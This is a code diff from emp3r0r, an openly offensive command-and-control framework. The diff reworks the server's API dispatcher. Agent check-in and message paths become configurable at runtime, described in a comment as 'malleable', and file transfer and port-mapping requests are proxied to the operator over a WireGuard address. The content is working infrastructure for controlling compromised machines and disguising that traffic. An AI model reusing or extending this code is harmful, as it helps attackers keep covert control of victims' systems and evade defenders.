@@ -10,6 +10,7 @@ import (
 	"os"
 
 	"github.com/gorilla/mux"
+	"github.com/jm33-m0/emp3r0r/core/internal/live"
 	"github.com/jm33-m0/emp3r0r/core/internal/transport"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
@@ -28,13 +29,23 @@ func apiDispatcher(wrt http.ResponseWriter, req *http.Request) {
 	logging.Debugf("Got a request: api=%s, token=%s", vars["api"], vars["token"])
 
 	// forward to operator
-	api := transport.WebRoot + "/" + vars["api"]
+	// checkin path
+	checkinPath := live.RuntimeConfig.CheckInPath
+	if checkinPath == "" {
+		checkinPath = "checkin"
+	}
 
-	// Create base target URL
+	// msg path
+	msgPath := live.RuntimeConfig.MsgPath
+	if msgPath == "" {
+		msgPath = "msg"
+	}
+
+	// Create base target URL for operator proxying
 	targetURL := fmt.Sprintf("https://%s:%d", netutil.WgOperatorIP, netutil.WgRelayedHTTPPort)
 	parsedURL, err := url.Parse(targetURL)
 	if err != nil {
-		logging.Errorf("handleFTPTransfer: %v", err)
+		logging.Errorf("apiDispatcher: parsedURL: %v", err)
 		http.Error(wrt, "Internal server error", http.StatusInternalServerError)
 		return
 	}
@@ -51,7 +62,7 @@ func apiDispatcher(wrt http.ResponseWriter, req *http.Request) {
 	rootCAs := x509.NewCertPool()
 	capem, err := os.ReadFile(transport.OperatorCaCrtFile)
 	if err != nil {
-		logging.Errorf("Failed to parse CA cert: %v", err)
+		logging.Errorf("apiDispatcher: parse CA cert: %v", err)
 		http.Error(wrt, "Internal server error", http.StatusInternalServerError)
 		return
 	}
@@ -75,21 +86,21 @@ func apiDispatcher(wrt http.ResponseWriter, req *http.Request) {
 	req = req.WithContext(req.Context())
 
 	// handlers
-	switch api {
-	case transport.CheckInAPI:
+	switch vars["api"] {
+	case checkinPath:
 		handleAgentCheckIn(wrt, req)
-	case transport.MsgAPI:
+	case msgPath:
 		handleMessageTunnel(wrt, req)
-	case transport.Upload2AgentAPI:
+	case "ftp": // fixed path for legacy support or internal use if needed, but should ideally be malleable too
 		logging.Debugf("About to proxy request: %s %s", req.Method, req.URL.Path)
 		logging.Debugf("Request headers: %v", req.Header)
 		proxy.ServeHTTP(wrt, req)
-	case transport.DownloadFile2AgentAPI:
+	case "www":
 		logging.Debugf("About to proxy request: %s %s", req.Method, req.URL.Path)
 		logging.Debugf("Request headers: %v", req.Header)
 		logging.Debugf("Forwarding PUT request to operator at %s", targetURL)
 		proxy.ServeHTTP(wrt, req)
-	case transport.PortMappingAPI:
+	case "proxy":
 		logging.Debugf("About to proxy request: %s %s", req.Method, req.URL.Path)
 		logging.Debugf("Request headers: %v", req.Header)
 		logging.Debugf("Forwarding port mapping request to operator at %s", targetURL)
